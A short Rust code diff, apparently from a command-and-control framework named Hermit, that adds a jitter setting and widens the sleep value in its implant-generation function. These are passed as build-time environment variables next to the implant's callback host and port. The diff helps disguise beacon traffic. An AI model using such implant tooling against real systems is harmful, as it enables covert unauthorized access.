@@ -23,7 +23,8 @@ pub fn generate(
     os: String,
     arch: String,
     format: String,
-    sleep: u16,
+    sleep: u64,
+    jitter: u64,
 ) -> Result<(String, Vec<u8>), Error> {
 
     info!("Generating an implant...");
@@ -67,6 +68,7 @@ pub fn generate(
     env::set_var("HERMIT_LHOST", host.to_string());
     env::set_var("HERMIT_LPORT", port.to_string());
     env::set_var("HERMIT_SLEEP", sleep.to_string());
+    env::set_var("HERMIT_JITTER", jitter.to_string());
     env::set_var("HERMIT_USER_AGENT", user_agent.to_string());
     env::set_var("HERMIT_PUBLIC_KEY", server_public_key.to_string());
     env::set_var("OUT_DIR", "implants/src".to_string());
